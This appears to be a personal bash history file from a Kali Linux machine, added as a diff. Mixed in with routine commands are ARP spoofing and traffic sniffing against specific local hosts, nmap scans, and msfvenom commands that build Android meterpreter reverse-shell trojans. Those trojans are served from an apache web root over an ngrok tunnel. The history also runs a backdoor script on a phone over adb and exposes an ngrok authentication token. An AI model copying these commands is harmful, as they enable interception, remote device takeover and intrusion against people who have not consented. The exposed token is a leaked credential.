@@ -1,0 +1,608 @@
+    1  cd 100-shell-script-examples-master/
+    2  ls -n
+    3  sh 011-colors.sh 
+    4  cat 011-colors.sh 
+    5  cd script
+    6  nano hscript.sh
+    7  hackwifi
+    8  tree
+    9  cd script
+   10  tree
+   11  chmod +x ChooseAnOS.sh 
+   12  sh ChooseAnOS.sh 
+   13  sh ChooseAnOS.sh 
+   14  cd script/
+   15  touch ChooseAnOS.sh
+   16  nano ChooseAnOS.sh 
+   17  cd script
+   18  sh ChooseAnOS.sh 
+   19  h
+   20  cd script
+   21  nano hscript.sh
+   22  h
+   23  cd script
+   24  ca hscript.sh > hscript.sh.backup 
+   25  cat hscript.sh > hscript.sh.backup 
+   26  h
+   27  cd script
+   28  ls -n
+   29  googler hd hollywood wallpapers
+   30  hs
+   31  h
+   32  i
+   33  h
+   34  nano script
+   35  nano script/hscript.sh
+   36  cat script/hscript.sh.backup 
+   37  h
+   38  hh
+   39  h
+   40  cd script
+   41  mall
+   42  h
+   43  cd script
+   44  ls -n
+   45  sh ChooseAnOS.sh 
+   46  nano ChooseAnOS.sh 
+   47  sh ChooseAnOS.sh 
+   48  ls -n
+   49  nano mountall.sh 
+   50  cd script
+   51  ls -n
+   52  nano update-source.sh 
+   53  googler source meaning
+   54  apt-get update
+   55  apt-get upgrade
+   56  apt-get update
+   57  apt-get upgrade
+   58  cd /etc/apt
+   59  nano sources.list
+   60  ls -n
+   61  cat sources.list.backup 
+   62  cat sources.list.backup | grep deb
+   63  cat sources.list.backup | grep deb > sources.list
+   64  cat sources.list
+   65  sh update-source.sh 
+   66  cd ..
+   67  ls -n
+   68  cd newfolder/
+   69  ls
+   70  cd ..
+   71  ls
+   72  cd script/txt/
+   73  ls
+   74  cat sources.list 
+   75  cat sources.list > sources.list.backup
+   76  cat /etc/apt
+   77  cd /etc/apt
+   78  cat sources.list
+   79  > sources.list
+   80  cat sources.list
+   81  cd script/
+   82  nano update-source.sh 
+   83  sh update-source.sh 
+   84  nano update-source.sh 
+   85  mall
+   86  netdiscover
+   87  ip route
+   88  ifconfig
+   89  ip route
+   90  192.168.225.33192.168.225.1
+   91  route -n
+   92  arpspoof -i wlan0 -t 192.168.225.1 192.168.225.33
+   93  dsniff
+   94  arpspoof -i wlan0 -t 192.168.225.33 192.168.225.1
+   95  arp-scan -l
+   96  arp-scan -I wlan0 -l 
+   97  route -a
+   98  iproute
+   99  ip-route
+  100  route
+  101  nmap -T4 -vv -A 192.168.225.0
+  102  arp-scan -l
+  103  arp
+  104  arp-scan -l
+  105  ping 192.168.225.33
+  106  ar
+  107  arp
+  108  nmap -T4 -vv -A 192.168.225.33
+  109  nmap -G
+  110  dsniff
+  111  route -n
+  112  arp
+  113  arp-scan -l
+  114  ping 192.168.225.33
+  115  arp
+  116  netdiscover
+  117  netdiscover man
+  118  netdiscover -r 192.168.225.0/50
+  119  netdiscover -r 192.168.225.0/50,15
+  120  netdiscover man
+  121  netdiscover -r 192.168.225.0
+  122  netdiscover -r 192.168.225.0/200
+  123  arpspoof -i wlan0 -t 192.168.225.1 192.168.225.33
+  124  arpspoof -i wlan0 -t 192.168.225.33 192.168.225.1
+  125  adb shell pm 
+  126  adb shell pm list
+  127  adb shell pm -k
+  128  adb shell pm -l
+  129  adb shell pm -l | grep metasploit
+  130  adb devices
+  131  adb shell
+  132  adb shell sh /sdcard/backdoor.sh
+  133  less crackstation-human-only.txt
+  134  wc -l crackstation-human-only.txt
+  135  googler 63941069 in words
+  136  python dict_gen.py 
+  137  ls -n
+  138  chmod +x dict_gen.py 
+  139  python dict_gen.py 
+  140  ls -n
+  141  less LICENSE
+  142  less LICENSE.txt 
+  143  ./dict_gen.py 
+  144  pycharm dict_gen.py 
+  145  touch wordlist.txt
+  146  less cpanel.txt 
+  147  mkdir scrap
+  148  mv cpanel.txt scrap/
+  149  less creditcardpincodes.txt 
+  150  mv creditcardpincodes.txt scrap/
+  151  less default-routers.txt 
+  152  mv default-routers.txt scrap/
+  153  less manuf 
+  154  less numlist-9digits.txt 
+  155  mv numlist-9digits.txt scrap/
+  156  less Real-Passwords-MegaLinks.md 
+  157  mv Real-Passwords-MegaLinks.md scrap/
+  158  less Top204Thousand-WPA-probable-v2.txt 
+  159  mv Top204Thousand-WPA-probable-v2.txt scrap/
+  160  mv Top304Thousand-probable-v2.txt scrap/
+  161  ls -n /media/root/GhostDrive/StephanWarePC/Hackwares/ /root/Desktop/
+  162  ln -s /media/root/GhostDrive/StephanWarePC/Hackwares/ /root/Desktop/
+  163  googler guru99
+  164  httrack https://www.guru99.com/
+  165  apt-cache search MagicBrick
+  166  apt-cache search magik
+  167  mall
+  168  h
+  169  nbyte
+  170  cd script
+  171  nano youtube.sh
+  172  chmod +x youtube.sh 
+  173  sh youtube.sh 
+  174  fshow
+  175  arp
+  176  ifconfig
+  177  driftnet -i wlan0
+  178  arp-scan -l
+  179  ip route
+  180  ping 192.168.225.25
+  181  ls -n
+  182  python xerosploit.py 
+  183  make 
+  184  python install.py 
+  185  xerosploit
+  186  ettercarp -G
+  187  ettercap -G
+  188  git clone https://github.com/LionSec/xerosploit
+  189  mall
+  190  localhost
+  191  cd script
+  192  ls -n
+  193  nano localhost.sh
+  194  chmod +x localhost.sh 
+  195  sh localhost.sh 
+  196  nano localhost.sh
+  197  sh localhost.sh 
+  198  service apache2 start
+  199  msfvenom -P android/meterpreter/reverse_tcp LHOST=192.168.225.39 LPORT=1234 -R > /root/Desktop/android.apk
+  200  msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.225.39 LPORT=1234 R > /root/Desktop/android.apk
+  201  service postgresql start
+  202  service metasploit start
+  203  ifconfig
+  204  bluefish /var/www/html/index.html
+  205  fshow
+  206  ifconfig
+  207  msfdb init
+  208  armitage
+  209  googler Armitage for linux
+  210  xdg-open https://www.fastandeasyhacking.com/download
+  211  ifconfig
+  212  l
+  213  ls -n
+  214  caat ngrok-stable-linux-authentication 
+  215  cat "ngrok authtoken" 
+  216  ./ngrok authtoken 2w1uhgVEvaoXMYF18pCT7_7xe9BuPUhzdUcQQ6jLgFs
+  217  l
+  218  ifconfig
+  219  eixt
+  220  exit
+  221  bash
+  222  exit
+  223  bash
+  224  ./ngrok tcp 80
+  225  service apache2 start
+  226  service apache2 stop
+  227  service apache2 restart
+  228  shutdown
+  229  shutdown now
+  230  mall
+  231  nbyte
+  232  cd /root/Desktop/
+  233  ls *.apk
+  234  rm *.apk
+  235  msfvenom android/meterpreter/reverse_tcp LHOST=192.168.225.39 R > /root/Desktop/trojan.apk
+  236  msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.225.39 R > /root/Desktop/trojan.apk
+  237  msfpayload android/meterpreter/reverse_tcp LHOST=192.168.225.39 R > /root/Desktop/android.apk
+  238  cd 
+  239  ./ngrok http 80
+  240  cd /home/script
+  241  ls -n
+  242  nano console.sh 
+  243  c
+  244  nano console.sh 
+  245  c
+  246  nano console.sh 
+  247  c
+  248  nano console.sh 
+  249  c
+  250  nano console.sh 
+  251  c
+  252  nano console.sh 
+  253  c
+  254  xerosploit
+  255  cd /home/script/
+  256  nano console.sh 
+  257  c
+  258  shutdown now
+  259  cd /home
+  260  c
+  261  cd script/
+  262  nano hscript.sh
+  263  c
+  264  cd /media/root/S
+  265  cd /media/root/
+  266  ls 
+  267  eixt
+  268  reboot
+  269  logoff
+  270  shutdown now
+  271  exit
+  272  cd /homoe
+  273  mall
+  274  cd /home
+  275  ls -n
+  276  dir
+  277  ls
+  278  c
+  279  googler how to install kali linux 2018.1 in virutal box 
+  280  youtube
+  281  Youtube
+  282  sh script/youtube.sh 
+  283  google how to install vmware tools in kali linux
+  284  googler how to install vmware tools in kali linux
+  285  cat /etc/apt/sources.list > /root/Desktop/source
+  286  googler meaning of faceook
+  287  shutdown now
+  288  cd script
+  289  ls 
+  290  c
+  291  hs
+  292  h
+  293  ls
+  294  sh ChooseAnOS.sh 
+  295  ls
+  296  cd metasploit/
+  297  ls
+  298  cat msfdeveloper.sh 
+  299  cd ..
+  300  wifiadb
+  301  cd /media/root/
+  302  ls
+  303  umount Stephanware
+  304  mv -r Stephanware/
+  305  rm -r Stephanware/
+  306  ls 
+  307  mall
+  308  ls
+  309  lls
+  310  ls
+  311  lsl
+  312  l
+  313  ls
+  314  sudo
+  315  sudo user
+  316  sh
+  317  exiti
+  318  exit
+  319  su
+  320  exit
+  321  mall
+  322  bash
+  323  exit
+  324  bash
+  325  bash
+  326  fshow
+  327  arp
+  328  arp-scan
+  329  arp-scan -l
+  330  xerosploit
+  331  netdiscover
+  332  arp
+  333  nmap -T4 -vv -A 192.168.225.0
+  334  nmap -T4 -vv -A 192.168.225.0/50
+  335  nmap -T4 -vv -A -r 192.168.225.0/50
+  336  arp
+  337  ping 192.168.225.32
+  338  arp
+  339  nmap -T4 -vv -A 192.168.225.32
+  340  jiofi
+  341  route -n
+  342  arp
+  343  route -n
+  344  ipconfig
+  345  ifconfig
+  346  ip route
+  347  arp-scan -l
+  348  arp
+  349  ip route
+  350  route 
+  351  shutdown now
+  352  mall
+  353  exit
+  354  cd /media/root
+  355  ls 
+  356  fdisk
+  357  fdisk -l
+  358  mkdir StephanWare
+  359  mount /dev/sda3/ /media/root/StephanWare/
+  360  mount /dev/sda3 /media/root/StephanWare/
+  361  ls 
+  362  cd StephanWare/
+  363  ls
+  364  exit
+  365  cat script/mountall.sh 
+  366  cd /media/root/
+  367  ls 
+  368  cat script/mountall.sh 
+  369  umount /media/root/StephanWare 
+  370  cd /media/root/
+  371  ls 
+  372  mv StephanWare/ Stephanware/
+  373  ls 
+  374  mount /dev/sda3 /media/root/Stephanware/
+  375  exit
+  376  route -n
+  377  arp
+  378  ip route
+  379  arp-scan -I wlan0 -i
+  380  arp-scan -I wlan0 -l
+  381  exit
+  382  ip route
+  383  exit
+  384  service apache2 start
+  385  ifconfig
+  386  route -n
+  387  jiofi
+  388  cd Desktop/
+  389  lsl
+  390  ls
+  391  nano hackedu.html
+  392  xerosploit
+  393  xdg-open Desktop/
+  394  googler where is churchchill
+  395  arp
+  396  ping 192.168.225.33
+  397  #
+  398  xdg-open /opt/xerosploit/xedriftnet
+  399  route -n
+  400  nmap -T4 -vv -A 192.168.225.33
+  401  xerosploit
+  402  xeroxploit
+  403  xerosploit
+  404  googler HD Moveis Wallpapers
+  405  mall
+  406  cd /media/root/
+  407  ls
+  408  mall
+  409  ls
+  410  setoolkit
+  411  ifconfig
+  412  ping google.com
+  413  googler googler.com
+  414  ifconfig
+  415  googler googler.com
+  416  googler google.com
+  417  pkg
+  418  whoami
+  419  user
+  420  mall
+  421  ls 
+  422  cd script
+  423  ls
+  424  sh websites.sh 
+  425  c
+  426  h
+  427  ls
+  428  cat hscript.sh > hscript.sh.backup
+  429  cat hscript.sh > hscript.backup.sh
+  430  shutdown now
+  431  cd /home/wordlisit
+  432  cd /home/wordlist
+  433  ls
+  434  ls -n
+  435  cd /home/wordlist/
+  436  ls -n
+  437  dir *.sh
+  438  chmod +x onelist.sh 
+  439  ls -n
+  440  sh onelist.sh 
+  441  nano onelist.sh 
+  442  sh onelist.sh 
+  443  mall
+  444  ping www.sxcran.org
+  445  nmap -T4 -vv -A 182.71.213.139
+  446  ifconfig
+  447  service apache2 start
+  448  ls -a
+  449  cd .set
+  450  ls
+  451  ln -s /root/.set /root/Desktop/
+  452  setoolkit
+  453  msfconsole
+  454  cd /
+  455  ls
+  456  cd usr
+  457  ls 
+  458  cd var
+  459  ls
+  460  cd /
+  461  cd var
+  462  lsl
+  463  ls
+  464  cd /var/www/html/
+  465  lsl
+  466  ls
+  467  nano index.html
+  468  shutdown now
+  469  cd /De
+  470  cd Desktop/
+  471  ls -a
+  472  mv .set set
+  473  cd set
+  474  ls
+  475  mv payload.exe /var/www/html/
+  476  mall
+  477  cd script
+  478  ls 
+  479  h
+  480  shutdown now
+  481  mall
+  482  apt-cache search UNetbootin.
+  483  apt-cache search UNetbootin
+  484  apt-cache search unetbootin
+  485  apt-cache search bootin
+  486  fdisk
+  487  fdisk -l
+  488  ls -n
+  489  cd Do
+  490  cd Downloads/
+  491  ls -n
+  492  chmod +x unetbootin-linux64-661.bin 
+  493  ls -n
+  494  ./unetbootin-linux64-661.bin 
+  495  cd /media/root/
+  496  ls -n
+  497  cd KALI\ LIVE/
+  498  ls 
+  499  googler how to execute bin file in linux
+  500  lusb
+  501  cd /home/tool/liveusb
+  502  ls
+  503  cd Downloads/
+  504  ls -n
+  505  mv unetbootin-linux64-661.bin /home/tool/
+  506  cd /home/tool/
+  507  ls 
+  508  mkdir liveusb
+  509  mv unetbootin-linux64-661.bin liveusb/
+  510  ls
+  511  perl iplocator.pl 
+  512  cd liveusb/
+  513  ls
+  514  ./unetbootin-linux64-661.bin 
+  515  nano liveusb.sh
+  516  cd 
+  517  nano /root/.bashrc
+  518  lsub
+  519  lusb
+  520  nano /root/.bashrc
+  521  lusb
+  522  ls -n
+  523  cd wi
+  524  cd Window7/
+  525  ls -n
+  526  less ubnpathl.txt 
+  527  shutdown now
+  528  apt-cache search rufus
+  529  googler usb live iso in linux
+  530  apt-get install unetbootin
+  531  add-apt-repository ppa:gezakovacs/ppa
+  532  mall
+  533  lusb
+  534  h
+  535  cd script
+  536  ls -n
+  537  nano hscript.
+  538  nano hscript.sh
+  539  h
+  540  h
+  541  cd script
+  542  ls -n
+  543  cat hscript.sh > hscript.sh.backup 
+  544  nano hscript.sh
+  545  h
+  546  m
+  547  h
+  548  nano script/hscript.
+  549  nano script/hscript.sh
+  550  h
+  551  nano script/hscript.sh
+  552  h
+  553  nano script/hscript.sh
+  554  h
+  555  shutdown now
+  556  adb devices
+  557  adb shell
+  558  adb kill-server
+  559  adb shell
+  560  adb reboot
+  561  adb devices
+  562  adb
+  563  adb reboot
+  564  adb reconnect
+  565  adb devicess
+  566  adb devices
+  567  h
+  568  alias
+  569  findmydevice
+  570  sh /home/script/findmydevice.sh 
+  571  exit
+  572  ifconfig
+  573  service postgresql start
+  574  msfconsole
+  575  basg
+  576  bash
+  577  sudo
+  578  bash su
+  579  su bash
+  580  su toor
+  581  sh su
+  582  mall
+  583  nbyte
+  584  msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.225.39 LPORT=4444 R > /root/Desktop/trojan.apk
+  585  cp /root/Desktop/trojan.apk /var/www/html/
+  586  cd /var/www/html/
+  587  ls -n
+  588  nano index.html
+  589  service apache2 start
+  590  ifconfig
+  591  service postgresql start
+  592  msfconsole
+  593  cd 
+  594  cd /root/Desktop/
+  595  ls -n
+  596  chmod +x trojan.apk 
+  597  ls -n
+  598  shutdown now
+  599  clear
+  600  bash
+  601  su
+  602  alias > alias_21062018
+  603  cat alias_21062018 
+  604  ls -n
+  605  cat bashrc-29thMay > bashrc_29052018
+  606  exit
+  607  history
+  608  history > history_21062018
